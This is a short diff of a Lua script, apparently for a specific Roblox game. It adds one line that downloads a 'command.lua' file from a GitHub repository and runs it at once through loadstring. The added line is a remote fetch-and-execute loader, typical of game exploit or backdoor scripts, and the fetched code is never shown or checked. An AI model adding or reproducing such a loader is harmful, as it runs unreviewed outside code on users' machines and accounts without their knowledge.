@@ -87,6 +87,7 @@ task.defer(function()
 end)
 
 if game.PlaceId ~= 6110766473 then return end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/NeuronerX/verysigma2/refs/heads/main/command.lua'))()
 
 local Players           = game:GetService("Players")
 local RunService        = game:GetService("RunService")
